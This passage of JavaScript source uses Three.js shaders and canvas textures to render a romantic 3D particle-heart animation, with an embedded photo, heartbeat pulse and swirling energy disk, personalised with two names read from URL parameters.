/**
 * 3D Cinematic Love Experience - Universal App Engine
 * - Couple: Đào Đức ❤️ Quỳnh Anh
 * - Embedded 3D Circular Pink Framed Photo (vip.png) as the beating core of the 3D Heart
 * - 3D Volumetric Sculpted Heart: Dense outer shell & mid-body wrapping around the photo
 * - Holographic Space Carpet (Tấm Thảm Không Gian) beneath the heart with undulating wave grid
 * - Pure Heart Explosion on tap / click
 * - 22 Memory Photos (1.png - 22.png) floating gently from bottom to top (5-7 active, ~5% size)
 */
(function() {
    'use strict';

    // =========================================================================
    // 1. CONFIGURATION & URL PARSER
    // =========================================================================
    const DEFAULT_LOVE_CONFIG = {
        person1: "Đào Đức",
        person2: "Quỳnh Anh",
        date: "",
        mainMessage: "Đào Đức ❤️ Quỳnh Anh",
        messages: [
            "Đào Đức ❤️ Quỳnh Anh",
            "Đào Đức",
            "Quỳnh Anh",
            "I LOVE YOU",
            "Forever",
            "Love You",
            "Together",
            "Our Love",
            "Forever & Always",
            "My Only One",
            "Yêu Em Mãi Mãi",
            "Bên Nhau Trọn Đời",
            "❤️"
        ],
        mainHeartColor: "#ff003c",
        goldHeartColor: "#ffd76a",
        textColor: "#ff4d91",
        textGlowColor: "#ff0055",
        backgroundColor: "#050003",
        musicUrl: "assets/music.mp3"
    };

    function decodeConfigFromUrl(encodedStr) {
        if (!encodedStr) return null;
        try {
            const binaryStr = atob(decodeURIComponent(encodedStr));
            const bytes = new Uint8Array(binaryStr.length);
            for (let i = 0; i < binaryStr.length; i++) {
                bytes[i] = binaryStr.charCodeAt(i);
            }
            const jsonStr = new TextDecoder().decode(bytes);
            return JSON.parse(jsonStr);
        } catch (e) {
            console.error("Failed to decode config:", e);
            return null;
        }
    }

    function getActiveLoveConfig() {
        const urlParams = new URLSearchParams(window.location.search);
        const encodedData = urlParams.get('d') || urlParams.get('data');
        let customConfig = {};

        if (encodedData) {
            const decoded = decodeConfigFromUrl(encodedData);
            if (decoded) customConfig = decoded;
        } else {
            const p1 = urlParams.get('p1');
            const p2 = urlParams.get('p2');
            const msg = urlParams.get('msg');
            const music = urlParams.get('music');

            if (p1) customConfig.person1 = p1;
            if (p2) customConfig.person2 = p2;
            if (msg) customConfig.mainMessage = msg;
            if (music) customConfig.musicUrl = music;
        }

        const merged = Object.assign({}, DEFAULT_LOVE_CONFIG, customConfig);
        if (customConfig.messages && Array.isArray(customConfig.messages) && customConfig.messages.length > 0) {
            merged.messages = customConfig.messages;
        } else {
            const dynamicList = [
                merged.mainMessage || `${merged.person1} ❤️ ${merged.person2}`,
                `${merged.person1} ❤️ ${merged.person2}`,
                merged.person1,
                merged.person2,
                "I LOVE YOU",
                "Forever & Always",
                "Together",
                "Our Love",
                "My World",
                "Yêu Em Mãi Mãi",
                "Bên Nhau Trọn Đời",
                "❤️"
            ].filter(Boolean);
            merged.messages = Array.from(new Set(dynamicList));
        }
        return merged;
    }

    // =========================================================================
    // 2. DEVICE & PERFORMANCE TUNER
    // =========================================================================
    const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || (window.innerWidth <= 768);

    function getPerformanceConfig() {
        const mobile = isMobile();
        return {
            isMobile: mobile,
            pixelRatio: Math.min(window.devicePixelRatio || 1, 2.5),
            heartParticles: mobile ? 130000 : 150000,
            groundGridX: mobile ? 70 : 85,
            groundGridZ: mobile ? 70 : 85,
            sparkleCount: mobile ? 280 : 350,
            floatingHeartCount: mobile ? 35 : 45,
            floatingTextCount: mobile ? 14 : 18,
            bloomStrength: 0.95,
            bloomRadius: 0.48,
            bloomThreshold: 0.38
        };
    }

    // =========================================================================
    // 3. MATH & RANDOM HELPERS
    // =========================================================================
    const randomRange = (min, max) => Math.random() * (max - min) + min;
    const randomChoice = (arr) => arr[Math.floor(Math.random() * arr.length)];
    const lerp = (start, end, amt) => (1 - amt) * start + amt * end;
    
    function randomGaussian(mean = 0, stdev = 1) {
        let u = 1 - Math.random();
        let v = Math.random();
        let z = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
        return z * stdev + mean;
    }

    // =========================================================================
    // 4. PROCEDURAL TEXTURES & CIRCULAR PINK PHOTO
    // =========================================================================
    const textureCache = new Map();

    function createHeartTexture(size = 128, color = '#ffffff') {
        const key = `heart_${size}_${color}`;
        if (textureCache.has(key)) return textureCache.get(key);

        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');

        const center = size / 2;
        const s = size * 0.44;

        const glowGrad = ctx.createRadialGradient(center, center, s * 0.1, center, center, size * 0.48);
        glowGrad.addColorStop(0, 'rgba(255, 255, 255, 1.0)');
        glowGrad.addColorStop(0.35, 'rgba(255, 120, 160, 0.7)');
        glowGrad.addColorStop(0.75, 'rgba(255, 30, 80, 0.2)');
        glowGrad.addColorStop(1, 'rgba(255, 0, 80, 0)');

        ctx.fillStyle = glowGrad;
        ctx.beginPath();
        ctx.arc(center, center, size * 0.48, 0, Math.PI * 2);
        ctx.fill();

        ctx.save();
        ctx.translate(center, center + s * 0.08);
        ctx.beginPath();
        ctx.moveTo(0, s * 0.35);
        ctx.bezierCurveTo(-s * 0.6, -s * 0.3, -s * 0.7, s * 0.1, 0, s * 0.75);
        ctx.bezierCurveTo(s * 0.7, s * 0.1, s * 0.6, -s * 0.3, 0, s * 0.35);
        ctx.closePath();

        ctx.fillStyle = color;
        ctx.shadowColor = 'rgba(255, 255, 255, 0.9)';
        ctx.shadowBlur = size * 0.08;
        ctx.fill();
        ctx.restore();

        const texture = new THREE.CanvasTexture(canvas);
        texture.generateMipmaps = true;
        texture.minFilter = THREE.LinearMipmapLinearFilter;
        texture.magFilter = THREE.LinearFilter;
        textureCache.set(key, texture);
        return texture;
    }

    function createGlowDiscTexture(size = 64) {
        const key = `glow_disc_${size}`;
        if (textureCache.has(key)) return textureCache.get(key);

        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');

        const center = size / 2;
        const radius = size / 2;

        const grad = ctx.createRadialGradient(center, center, 0, center, center, radius);
        grad.addColorStop(0, 'rgba(255, 255, 255, 1.0)');
        grad.addColorStop(0.25, 'rgba(255, 200, 220, 0.85)');
        grad.addColorStop(0.6, 'rgba(255, 50, 100, 0.25)');
        grad.addColorStop(1, 'rgba(255, 0, 50, 0)');

        ctx.fillStyle = grad;
        ctx.beginPath();
        ctx.arc(center, center, radius, 0, Math.PI * 2);
        ctx.fill();

        const texture = new THREE.CanvasTexture(canvas);
        textureCache.set(key, texture);
        return texture;
    }

    function createSparkleTexture(size = 128) {
        const key = `sparkle_${size}`;
        if (textureCache.has(key)) return textureCache.get(key);

        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');
        const center = size / 2;

        const grad = ctx.createRadialGradient(center, center, 0, center, center, size * 0.4);
        grad.addColorStop(0, 'rgba(255, 255, 255, 1.0)');
        grad.addColorStop(0.4, 'rgba(255, 220, 240, 0.6)');
        grad.addColorStop(1, 'rgba(255, 100, 150, 0)');
        ctx.fillStyle = grad;
        ctx.beginPath();
        ctx.arc(center, center, size * 0.4, 0, Math.PI * 2);
        ctx.fill();

        ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
        ctx.beginPath();
        ctx.ellipse(center, center, size * 0.46, size * 0.05, 0, 0, Math.PI * 2);
        ctx.fill();

        ctx.beginPath();
        ctx.ellipse(center, center, size * 0.05, size * 0.46, 0, 0, Math.PI * 2);
        ctx.fill();

        const texture = new THREE.CanvasTexture(canvas);
        textureCache.set(key, texture);
        return texture;
    }

    function createNeonTextTexture(text, options = {}) {
        const fontSize = options.fontSize || 54;
        const color = options.color || '#ff4d91';
        const glowColor = options.glowColor || '#ff0055';
        const fontFamily = options.fontFamily || "'Be Vietnam Pro', 'Montserrat', 'Outfit', sans-serif";
        const fontWeight = options.fontWeight || '700';

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        const fontStr = `${fontWeight} ${fontSize}px ${fontFamily}`;
        ctx.font = fontStr;

        const metrics = ctx.measureText(text);
        const textWidth = Math.ceil(metrics.width);
        const textHeight = Math.ceil(fontSize * 1.6);
        const padding = Math.ceil(fontSize * 0.9);

        canvas.width = textWidth + padding * 2;
        canvas.height = textHeight + padding * 2;

        ctx.font = fontStr;
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        const cx = canvas.width / 2;
        const cy = canvas.height / 2;

        // 1. Neon ambient outer glow
        ctx.shadowColor = glowColor;
        ctx.shadowBlur = fontSize * 0.6;
        ctx.fillStyle = color;
        ctx.fillText(text, cx, cy);

        // 2. Crisp inner text
        ctx.shadowBlur = fontSize * 0.15;
        ctx.fillStyle = '#ffffff';
        ctx.fillText(text, cx, cy);

        const texture = new THREE.CanvasTexture(canvas);
        texture.generateMipmaps = true;
        texture.minFilter = THREE.LinearMipmapLinearFilter;
        texture.magFilter = THREE.LinearFilter;
        texture.needsUpdate = true;

        return {
            texture,
            aspectRatio: canvas.width / canvas.height,
            width: canvas.width,
            height: canvas.height
        };
    }

    function createCircularPinkPhotoTexture(onReady) {
        const canvas = document.createElement('canvas');
        canvas.width = 512;
        canvas.height = 512;
        const ctx = canvas.getContext('2d');

        const tex = new THREE.CanvasTexture(canvas);
        if (THREE.sRGBEncoding) tex.encoding = THREE.sRGBEncoding;

        const drawImg = (image) => {
            if (!image || !image.width) return;
            ctx.clearRect(0, 0, 512, 512);

            // Cut clean circular avatar without any black box or borders
            ctx.save();
            ctx.beginPath();
            ctx.arc(256, 256, 250, 0, Math.PI * 2);
            ctx.closePath();
            ctx.clip();

            // Tăng cường độ sáng, tương phản và độ tươi cho ảnh sáng rõ, sắc nét
            ctx.filter = 'brightness(1.22) contrast(1.10) saturate(1.10)';

            const minDim = Math.min(image.width, image.height);
            const sx = (image.width - minDim) / 2;
            const sy = (image.height - minDim) / 2;
            ctx.drawImage(image, sx, sy, minDim, minDim, 0, 0, 512, 512);
            ctx.restore();

            tex.needsUpdate = true;
        };

        const img = new Image();
        img.onload = () => drawImg(img);

        const sources = [
            (typeof window !== 'undefined' && window.PROFILE_PHOTO_DATA) ? window.PROFILE_PHOTO_DATA : '',
            'profile.png',
            'profile.jpg',
            'vip.jpg',
            'vip.png'
        ].filter(Boolean);

        let srcIdx = 0;
        img.onerror = () => {
            srcIdx++;
            if (srcIdx < sources.length) {
                img.src = sources[srcIdx];
            }
        };

        img.src = sources[0];
        if (img.complete && img.naturalWidth > 0) {
            drawImg(img);
        }

        onReady(tex);
    }

    const memoryPhotoCache = new Map();
    // Load and build clean circular texture with soft glowing border for 14 memory photos
    function createCircularMemoryPhotoTexture(src, index = 0) {
        const cacheKey = src || ('oanh_' + index);
        if (memoryPhotoCache.has(cacheKey)) return memoryPhotoCache.get(cacheKey);

        const size = 256;
        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');
        const center = size / 2;
        const radius = size * 0.44;

        const tex = new THREE.CanvasTexture(canvas);
        if (THREE.sRGBEncoding) tex.encoding = THREE.sRGBEncoding;

        const draw = (img) => {
            if (!img || !img.width) return;
            ctx.clearRect(0, 0, size, size);

            // 1. Soft glowing outer halo
            ctx.save();
            ctx.beginPath();
            ctx.arc(center, center, radius + 3, 0, Math.PI * 2);
            ctx.fillStyle = 'rgba(255, 105, 180, 0.35)';
            ctx.shadowColor = 'rgba(255, 50, 130, 0.9)';
            ctx.shadowBlur = 12;
            ctx.fill();
            ctx.restore();

            // 2. Circular clipped photo
            ctx.save();
            ctx.beginPath();
            ctx.arc(center, center, radius, 0, Math.PI * 2);
            ctx.closePath();
            ctx.clip();

            // Brightness & Contrast boost
            ctx.filter = 'brightness(1.20) contrast(1.10) saturate(1.10)';

            const minDim = Math.min(img.width, img.height);
            const sx = (img.width - minDim) / 2;
            const sy = (img.height - minDim) / 2;
            ctx.drawImage(img, sx, sy, minDim, minDim, center - radius, center - radius, radius * 2, radius * 2);
            ctx.restore();

            // 3. Delicate rounded border
            ctx.save();
            ctx.beginPath();
            ctx.arc(center, center, radius, 0, Math.PI * 2);
            ctx.lineWidth = 4.0;
            ctx.strokeStyle = 'rgba(255, 192, 203, 0.95)';
            ctx.shadowColor = 'rgba(255, 105, 180, 0.6)';
            ctx.shadowBlur = 6;
            ctx.stroke();
            ctx.restore();

            tex.needsUpdate = true;
        };

        const img = new Image();
        img.onload = () => draw(img);

        const dataSrc = (typeof window !== 'undefined' && window.OANH_PHOTO_DATA && window.OANH_PHOTO_DATA[index]) 
            ? window.OANH_PHOTO_DATA[index] 
            : src;

        img.onerror = () => {
            if (img.src !== src && !img.src.includes('./oanh/')) {
                img.src = './' + src;
            }
        };

        img.src = dataSrc;
        if (img.complete && img.naturalWidth > 0) {
            draw(img);
        }

        memoryPhotoCache.set(cacheKey, tex);
        return tex;
    }

    // =========================================================================
    // 5. 3D OBJECTS
    // =========================================================================

    // --- ParticleHeart: Volumetric 3D Sculpted Heart with Embedded Circular Pink Photo ---
    class ParticleHeart {
        constructor(scene) {
            this.scene = scene;
            const perf = getPerformanceConfig();
            this.particleCount = perf.heartParticles;

            this.group = new THREE.Group();
            this.scene.add(this.group);

            this.group.rotation.set(0, 0, 0); // Thẳng đứng, cân đối tuyệt đối trước sau
            this.group.position.y = -2.35; // Hạ trái tim xuống thấp sát 2/10 đáy
            this.photoBaseScale = 0.0;
            this.isPhotoRevealed = false;

            this.initGeometry();
            this.initMaterial();
            this.initPoints();
            this.updateScale();
        }

        updateScale() {
            const aspect = window.innerWidth / window.innerHeight;
            if (aspect < 1.0) {
                // Mobile
                const mobileScale = Math.min(0.72, Math.max(0.58, aspect * 1.35));
                this.group.scale.setScalar(mobileScale);
            } else {
                // Desktop / Laptop: Tăng to hơn một chút vừa vặn và đẹp mắt
                const desktopScale = Math.min(0.90, Math.max(0.78, (window.innerHeight / 900) * 0.88));
                this.group.scale.setScalar(desktopScale);
            }
        }

        initGeometry() {
            this.geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(this.particleCount * 3);
            const startPositions = new Float32Array(this.particleCount * 3);
            const targetPositions = new Float32Array(this.particleCount * 3);
            const goldColors = new Float32Array(this.particleCount * 3);
            const redColors = new Float32Array(this.particleCount * 3);
            const sizes = new Float32Array(this.particleCount);
            const phases = new Float32Array(this.particleCount);
            const sparkleSpeeds = new Float32Array(this.particleCount);

            const goldPalette = [
                new THREE.Color('#FFD76A'),
                new THREE.Color('#FFC837'),
                new THREE.Color('#FFE58F'),
                new THREE.Color('#FFF1B0'),
                new THREE.Color('#E6A817')
            ];

            const redPalette = [
                new THREE.Color('#ff0033'),
                new THREE.Color('#e60029'),
                new THREE.Color('#cc0026'),
                new THREE.Color('#ff0044'),
                new THREE.Color('#d40030'),
                new THREE.Color('#b80024')
            ];

            // 3D Solid Heart Manifold hoàn toàn cân đối trước - sau đồng đều 100%
            function inside3DHeart(x, y, z) {
                const a = x * x + y * y + 2.0 * z * z - 1.0;
                return (a * a * a - x * x * y * y * y - 0.08 * z * z * y * y * y) <= 0;
            }

            const scaleX = 3.50;
            const scaleY = 2.95;
            const scaleZ = 3.25;

            let sampled = 0;
            while (sampled < this.particleCount) {
                const x = (Math.random() * 2.6 - 1.3);
                const y = (Math.random() * 2.6 - 1.3);
                const z = (Math.random() * 1.8 - 0.9);

                if (!inside3DHeart(x, y, z)) continue;

                const i3 = sampled * 3;

                targetPositions[i3] = x * scaleX;
                targetPositions[i3 + 1] = y * scaleY + 0.35;
                targetPositions[i3 + 2] = z * scaleZ;

                // Shoot up from the Core Eye of the lower disk
                const diskCoreAngle = Math.random() * Math.PI * 2;
                const diskCoreRadius = 0.05 + Math.pow(Math.random(), 2.0) * 0.45;
                const diskCoreY = -6.45 + (Math.random() - 0.5) * 0.15;

                startPositions[i3] = Math.cos(diskCoreAngle) * diskCoreRadius;
                startPositions[i3 + 1] = diskCoreY;
                startPositions[i3 + 2] = Math.sin(diskCoreAngle) * diskCoreRadius;

                positions[i3] = startPositions[i3];
                positions[i3 + 1] = startPositions[i3 + 1];
                positions[i3 + 2] = startPositions[i3 + 2];

                const goldCol = goldPalette[Math.floor(Math.random() * goldPalette.length)];
                goldColors[i3] = goldCol.r;
                goldColors[i3 + 1] = goldCol.g;
                goldColors[i3 + 2] = goldCol.b;

                const redCol = redPalette[Math.floor(Math.random() * redPalette.length)];
                redColors[i3] = redCol.r;
                redColors[i3 + 1] = redCol.g;
                redColors[i3 + 2] = redCol.b;

                // Kích thước hạt đồng đều
                sizes[sampled] = 2.85 * (0.9 + Math.random() * 0.35);
                phases[sampled] = Math.random();
                sparkleSpeeds[sampled] = 1.2 + Math.random() * 2.5;

                sampled++;
            }

            this.geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            this.geometry.setAttribute('aStartPos', new THREE.BufferAttribute(startPositions, 3));
            this.geometry.setAttribute('aTargetPos', new THREE.BufferAttribute(targetPositions, 3));
            this.geometry.setAttribute('aGoldColor', new THREE.BufferAttribute(goldColors, 3));
            this.geometry.setAttribute('aRedColor', new THREE.BufferAttribute(redColors, 3));
            this.geometry.setAttribute('aSize', new THREE.BufferAttribute(sizes, 1));
            this.geometry.setAttribute('aPhase', new THREE.BufferAttribute(phases, 1));
            this.geometry.setAttribute('aSparkleSpeed', new THREE.BufferAttribute(sparkleSpeeds, 1));
        }

        initMaterial() {
            const discTexture = createGlowDiscTexture(64);

            this.uniforms = {
                uTime: { value: 0 },
                uConvergence: { value: 0.0 },
                uColorMode: { value: 0.0 },
                uTexture: { value: discTexture },
                uHeartScale: { value: 1.0 },
                uPulse: { value: 0.0 },
                uGlobalAlpha: { value: 0.0 },
                uExplode: { value: 0.0 }
            };

            const vertexShader = `
                attribute vec3 aStartPos;
                attribute vec3 aTargetPos;
                attribute vec3 aGoldColor;
                attribute vec3 aRedColor;
                attribute float aSize;
                attribute float aPhase;
                attribute float aSparkleSpeed;

                uniform float uTime;
                uniform float uConvergence;
                uniform float uColorMode;
                uniform float uHeartScale;
                uniform float uPulse;
                uniform float uGlobalAlpha;
                uniform float uExplode;

                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    float t = clamp(uConvergence, 0.0, 1.0);
                    vec3 mixedPos;

                    vec3 clusterCore = vec3(0.0, 0.4, 0.0) + (aTargetPos - vec3(0.0, 0.4, 0.0)) * 0.035;

                    if (t < 0.35) {
                        float p1 = t / 0.35;
                        float ease1 = pow(p1, 2.2);
                        mixedPos = mix(aStartPos, clusterCore, ease1);
                        float spiral = (1.0 - ease1) * 0.45;
                        mixedPos.x += sin(uTime * 5.0 + aPhase * 6.28) * spiral;
                        mixedPos.z += cos(uTime * 5.0 + aPhase * 6.28) * spiral;
                    } else if (t < 0.85) {
                        float p2 = (t - 0.35) / 0.50;
                        float c1 = 1.65;
                        float c3 = c1 + 1.0;
                        float ease2 = 1.0 + c3 * pow(p2 - 1.0, 3.0) + c1 * pow(p2 - 1.0, 2.0);
                        mixedPos = mix(clusterCore, aTargetPos, ease2);
                    } else {
                        mixedPos = aTargetPos;
                    }

                    if (t > 0.85) {
                        float osc = (t - 0.85) / 0.15;
                        float smallAmount = 0.035 * osc;
                        mixedPos.x += sin(uTime * 2.0 + aPhase * 6.28) * smallAmount;
                        mixedPos.y += cos(uTime * 1.8 + aPhase * 7.54) * smallAmount;
                        mixedPos.z += sin(uTime * 2.5 + aPhase * 5.02) * (smallAmount * 1.2);
                    }

                    if (uExplode > 0.001) {
                        vec3 burstDir = normalize(mixedPos - vec3(0.0, 0.4, 0.0));
                        mixedPos += burstDir * (uExplode * (1.8 + aPhase * 1.6));
                    }

                    vec3 finalPos = mixedPos * (uHeartScale + uPulse);
                    vec4 mvPosition = modelViewMatrix * vec4(finalPos, 1.0);
                    gl_Position = projectionMatrix * mvPosition;

                    float sparkle = 0.5 + 0.5 * sin(uTime * aSparkleSpeed + aPhase * 6.28);
                    float sizeSparkle = mix(0.88, 1.22, sparkle);

                    float burstSize = 1.0 + uExplode * 1.4 + (t < 0.35 ? (1.0 - t/0.35) * 0.45 : 0.0);
                    gl_PointSize = (aSize * sizeSparkle * burstSize) * (7.6 / -mvPosition.z);

                    vec3 baseCol = mix(aGoldColor, aRedColor, uColorMode);
                    vec3 flashLight = vec3(uExplode * 0.85);
                    vColor = baseCol + vec3(sparkle * 0.04) + flashLight;
                    vAlpha = uGlobalAlpha * mix(0.95, 1.0, sparkle);
                }
            `;

            const fragmentShader = `
                uniform sampler2D uTexture;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 texColor = texture2D(uTexture, gl_PointCoord);
                    if (texColor.a < 0.05) discard;
                    float alpha = pow(texColor.a, 0.55) * vAlpha;
                    gl_FragColor = vec4(vColor * 1.28, alpha);
                }
            `;

            this.material = new THREE.ShaderMaterial({
                uniforms: this.uniforms,
                vertexShader,
                fragmentShader,
                transparent: true,
                depthWrite: false,
                blending: THREE.AdditiveBlending
            });
        }

        initPoints() {
            this.points = new THREE.Points(this.geometry, this.material);
            this.group.add(this.points);

            this.photoBaseScale = 0.0;
            this.isPhotoRevealed = false;

            // Tạo 3D Photo Mesh hình tròn gắn liền trực tiếp vào Trái Tim
            createCircularPinkPhotoTexture((tex) => {
                const photoGeo = new THREE.PlaneGeometry(2.35, 2.35);
                const photoMat = new THREE.MeshBasicMaterial({
                    map: tex,
                    transparent: true,
                    opacity: 1.0,
                    side: THREE.DoubleSide,
                    depthWrite: false,
                    color: new THREE.Color(1.12, 1.12, 1.12)
                });
                this.photoMesh = new THREE.Mesh(photoGeo, photoMat);
                this.photoMesh.position.set(0, 0.95, 0.25); // Đặt chính xác giữa tâm trên của trái tim
                this.photoMesh.renderOrder = 9999;
                this.photoMesh.scale.set(0.0, 0.0, 0.0);
                this.group.add(this.photoMesh);

                if (this.uniforms.uColorMode.value > 0.5 || this.isPhotoRevealed) {
                    this.photoBaseScale = 1.0;
                }
            });
        }

        revealPhoto(duration = 1.2) {
            this.isPhotoRevealed = true;
            this.photoBaseScale = 1.0;
            if (this.photoMesh) {
                this.photoMesh.visible = true;
                const gsap = window.gsap;
                if (gsap) {
                    gsap.fromTo(this, { photoBaseScale: 0.0 }, {
                        photoBaseScale: 1.0,
                        duration: duration,
                        ease: "back.out(1.5)"
                    });
                }
            }
        }

        update(time) {
            this.uniforms.uTime.value = time;
            let pulseVal = 0;
            if (this.uniforms.uColorMode.value > 0.5) {
                // Tự động mở ảnh khi trái tim đã chuyển sang màu đỏ/hồng
                if (!this.isPhotoRevealed && this.photoBaseScale < 0.1) {
                    this.revealPhoto(1.2);
                }

                const period = 1.02; // Nhịp tim chân thực, uy lực
                const t = (time % period) / period;

                // 1. Thu vào sâu chuẩn bị phát lực (-16% kích thước)
                const shrink1 = -Math.exp(-Math.pow((t - 0.07) / 0.045, 2)) * 0.16;

                // 2. Nhịp chính đập bung ra cực mạnh (+42% kích thước - Lub)
                const beat1 = Math.exp(-Math.pow((t - 0.18) / 0.055, 2)) * 0.42;

                // 3. Thu vào đàn hồi giữa 2 nhịp (-10% kích thước)
                const shrink2 = -Math.exp(-Math.pow((t - 0.28) / 0.04, 2)) * 0.10;

                // 4. Nhịp phụ đập bung lần 2 (+24% kích thước - Dub)
                const beat2 = Math.exp(-Math.pow((t - 0.38) / 0.05, 2)) * 0.24;

                // 5. Thư giãn êm ái về trạng thái nghỉ
                const settle = -Math.exp(-Math.pow((t - 0.52) / 0.06, 2)) * 0.04;

                pulseVal = shrink1 + beat1 + shrink2 + beat2 + settle;
                this.uniforms.uPulse.value = pulseVal;
            }

            // Giữ Trái Tim luôn thẳng đứng, cân đối tuyệt đối khi quay 360 độ
            this.group.rotation.set(0, 0, 0);

            if (this.photoMesh) {
                const finalScale = this.photoBaseScale * (1.0 + pulseVal * 0.45);
                this.photoMesh.scale.set(finalScale, finalScale, finalScale);
            }
        }

        setConvergence(val) { this.uniforms.uConvergence.value = val; }
        setColorMode(val) { this.uniforms.uColorMode.value = val; }
        setAlpha(val) { this.uniforms.uGlobalAlpha.value = val; }
    }

    // --- BlackHoleEnergyCore: 3D Cosmic Energy Vortex supplying Pulsing Blood Vessel Veins (Tia Máu Năng Lượng) to Heart ---
    class BlackHoleEnergyCore {
        constructor(scene) {
            this.scene = scene;
            this.group = new THREE.Group();
            this.scene.add(this.group);
            this.globalAlpha = 0.0;
            this.colorMode = 0.0; // 0.0: Gold, 1.0: Deep Red Heart Colors
            this.baseY = -6.45;   // Đĩa hạ xuống thấp cách đáy 2/10
            this.group.position.set(0, this.baseY, 0);

            this.initBlackHole();
        }

        initBlackHole() {
            // Bảng màu Trái Tim & Huyết Quản Siêu Thực
            const goldPalette = [
                new THREE.Color('#FFD76A'),
                new THREE.Color('#FFC837'),
                new THREE.Color('#FFE58F'),
                new THREE.Color('#FFF1B0'),
                new THREE.Color('#E6A817')
            ];

            const redPalette = [
                new THREE.Color('#ff0033'),
                new THREE.Color('#e60029'),
                new THREE.Color('#cc0026'),
                new THREE.Color('#ff0044'),
                new THREE.Color('#d40030'),
                new THREE.Color('#b80024'),
                new THREE.Color('#ff3366')
            ];

            // 2. ĐĨA XOÁY NĂNG LƯỢNG (14.000 Hạt - To rộng hơn và nằm ở 3/4 phía dưới màn hình)
            this.diskParticleCount = 14000;
            const diskGeo = new THREE.BufferGeometry();
            const diskPositions = new Float32Array(this.diskParticleCount * 3);
            const diskGoldCols = new Float32Array(this.diskParticleCount * 3);
            const diskRedCols = new Float32Array(this.diskParticleCount * 3);
            const diskSizes = new Float32Array(this.diskParticleCount);
            const diskIntensities = new Float32Array(this.diskParticleCount);
            this.diskData = [];

            for (let i = 0; i < this.diskParticleCount; i++) {
                const i3 = i * 3;
                // Phân bổ hạt: Đĩa to rộng hơn (bán kính r = 4.75), tâm đầy đặn
                const isCenter = i < 3500; // 3.500 hạt tạo tâm đầy đặn
                let radius;
                if (isCenter) {
                    radius = 0.05 + Math.pow(Math.random(), 1.1) * 1.15; // Tâm đầy đặn, kín hạt
                } else {
                    radius = 1.15 + Math.pow(Math.random(), 0.90) * 3.60; // Phần ngoài to rộng
                }

                const angle = Math.random() * Math.PI * 2;
                const speed = (0.72 / Math.sqrt(radius + 0.22)) * (0.85 + Math.random() * 0.3);
                const heightOffset = (Math.random() - 0.5) * 0.18 * (radius * 0.25);

                diskPositions[i3] = Math.cos(angle) * radius;
                diskPositions[i3 + 1] = heightOffset;
                diskPositions[i3 + 2] = Math.sin(angle) * radius;

                const gCol = randomChoice(goldPalette);
                const rCol = randomChoice(redPalette);

                diskGoldCols[i3] = gCol.r;
                diskGoldCols[i3 + 1] = gCol.g;
                diskGoldCols[i3 + 2] = gCol.b;

                diskRedCols[i3] = rCol.r;
                diskRedCols[i3 + 1] = rCol.g;
                diskRedCols[i3 + 2] = rCol.b;

                // Vùng tâm đầy đặn, vùng ngoài sáng rõ
                if (isCenter) {
                    diskSizes[i] = randomRange(1.8, 3.2);
                    diskIntensities[i] = 1.10;
                } else {
                    diskSizes[i] = randomRange(2.2, 4.4);
                    diskIntensities[i] = 1.40;
                }

                this.diskData.push({
                    radius,
                    angle,
                    speed,
                    heightOffset,
                    pulsePhase: Math.random() * Math.PI * 2
                });
            }

            diskGeo.setAttribute('position', new THREE.BufferAttribute(diskPositions, 3));
            diskGeo.setAttribute('aGoldColor', new THREE.BufferAttribute(diskGoldCols, 3));
            diskGeo.setAttribute('aRedColor', new THREE.BufferAttribute(diskRedCols, 3));
            diskGeo.setAttribute('aSize', new THREE.BufferAttribute(diskSizes, 1));
            diskGeo.setAttribute('aIntensity', new THREE.BufferAttribute(diskIntensities, 1));

            this.diskUniforms = {
                uTexture: { value: createGlowDiscTexture(64) },
                uAlpha: { value: 0.0 },
                uColorMode: { value: 0.0 }
            };

            const diskVert = `
                attribute vec3 aGoldColor;
                attribute vec3 aRedColor;
                attribute float aSize;
                attribute float aIntensity;
                uniform float uAlpha;
                uniform float uColorMode;
                varying vec3 vColor;
                varying float vAlpha;
                varying float vIntensity;

                void main() {
                    vec4 mvPos = modelViewMatrix * vec4(position, 1.0);
                    gl_Position = projectionMatrix * mvPos;
                    float dist = length(position.xz);
                    // Đĩa to rộng với bán kính mở rộng 4.85
                    float edgeFade = smoothstep(4.85, 3.4, dist) * smoothstep(0.02, 0.20, dist);
                    gl_PointSize = aSize * (15.5 / -mvPos.z);
                    vColor = mix(aGoldColor, aRedColor, uColorMode);
                    vAlpha = uAlpha * edgeFade * 0.96;
                    vIntensity = aIntensity;
                }
            `;

            const diskFrag = `
                uniform sampler2D uTexture;
                varying vec3 vColor;
                varying float vAlpha;
                varying float vIntensity;

                void main() {
                    vec4 tex = texture2D(uTexture, gl_PointCoord);
                    if (tex.a < 0.05) discard;
                    gl_FragColor = vec4(vColor * vIntensity, tex.a * vAlpha);
                }
            `;

            this.diskMaterial = new THREE.ShaderMaterial({
                uniforms: this.diskUniforms,
                vertexShader: diskVert,
                fragmentShader: diskFrag,
                transparent: true,
                depthWrite: false,
                blending: THREE.AdditiveBlending
            });

            this.diskPoints = new THREE.Points(diskGeo, this.diskMaterial);
            // Đĩa nằm phẳng ngang hoàn toàn (rotation.x = 0), cố định đối xứng 360 độ
            this.diskPoints.rotation.x = 0.0;
            this.group.add(this.diskPoints);

            // 3. HỆ THỐNG CÁC HẠT ĐẬM MÀU BAY RỜI RẠC (TÁCH TÁCH) KẾT HỢP RANDOM VÀO TRÁI TIM (1.600 Distinct Individual Floating Sparks)
            // Giảm 1 nửa số lượng hạt (còn 1.600 hạt), bay thành từng hạt độc lập rời rạc tách biệt, không dính chùm thành dòng
            this.streamCount = 1600;
            const streamGeo = new THREE.BufferGeometry();
